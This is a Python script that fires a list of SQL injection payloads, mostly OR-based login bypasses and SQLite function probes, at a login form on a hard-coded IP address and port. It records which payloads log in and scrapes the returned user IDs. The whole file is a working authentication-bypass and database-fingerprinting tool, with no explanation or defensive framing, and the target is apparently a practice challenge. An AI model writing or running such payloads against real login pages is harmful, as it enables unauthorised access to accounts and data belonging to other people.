import requests

url = 'http://183.129.189.62:21313/login'

# Test ALL possible SQLite operators and functions
# The base query is likely: SELECT * FROM users WHERE username='...' AND password='...'
# After injection: username='admin' [INJECTION] AND password='test'

# We can use: admin' OR [expr]--  (OR works with quotes)
# But we need to find what operators work

tests = [
    # Basic operators - which work?
    ("admin' OR '1'='1", "OR '1'='1 (baseline)"),
    ("admin' OR '1", "OR '1 (short)"),
    ("admin' OR 1", "OR 1"),
    ("admin'||'1'='1", "concat ||"),
    ("admin'/**/OR/**/'1'='1", "comment bypass"),
    # Try to extract data with SQLite-specific functions
    ("admin' OR sqlite_version()='3", "sqlite_version()"),
    ("admin' OR typeof('a')='text", "typeof()"),
    ("admin' OR total_changes()=0", "total_changes()"),
    ("admin' OR last_insert_rowid()>0", "last_insert_rowid()"),
    ("admin' OR randomblob(1) IS NOT NULL", "randomblob()"),
    ("admin' OR zeroblob(1) IS NOT NULL", "zeroblob()"),
    ("admin' OR quote('a')='a'", "quote()"),
    ("admin' OR trim(' a ')='a'", "trim()"),
    ("admin' OR ltrim(' a ')='a '", "ltrim()"),
    ("admin' OR rtrim(' a ')=' a'", "rtrim()"),
    ("admin' OR upper('a')='A'", "upper()"),
    ("admin' OR lower('A')='a'", "lower()"),
    ("admin' OR length('abc')=3", "length()"),
    ("admin' OR substr('abc',1,1)='a'", "substr()"),
    ("admin' OR replace('abc','b','x')='axc'", "replace()"),
    ("admin' OR instr('abc','b')=2", "instr()"),
    ("admin' OR hex('a')='61'", "hex()"),
    ("admin' OR unicode('a')=97", "unicode()"),
    ("admin' OR char(97)='a'", "char()"),
    ("admin' OR abs(-1)=1", "abs()"),
    ("admin' OR round(1.5)=2", "round()"),
    ("admin' OR max(1,2)=2", "max()"),
    ("admin' OR min(1,2)=1", "min()"),
    ("admin' OR random() IS NOT NULL", "random()"),
    ("admin' OR coalesce(NULL,'a')='a'", "coalesce()"),
    ("admin' OR ifnull(NULL,'a')='a'", "ifnull()"),
    ("admin' OR nullif('a','b')='a'", "nullif()"),
    ("admin' OR CASE WHEN 1 THEN 1 END=1", "CASE WHEN"),
    ("admin' OR CAST('123' AS INTEGER)=123", "CAST()"),
    ("admin' OR (1) IS NOT NULL", "parentheses"),
    ("admin' OR NOT(1=0)", "NOT"),
    ("admin' OR (1=1) AND (2=2)", "AND with parens"),
]

s = requests.Session()
print('Testing SQLite operators/functions:')
for payload, desc in tests:
    r = s.post(url, data={'username': payload, 'password': 'test'}, timeout=10)
    ok = '已登录' in r.text
    if ok:
        text = r.text
        uid = '?'
        if '用户ID:' in text:
            istart = text.find('用户ID:') + 4
            iend = text.find(' |', istart)
            uid = text[istart:iend].strip()
        print(f'  [OK uid={uid:3s}] {desc}')
    else:
        print(f'  [FAIL   ] {desc}')
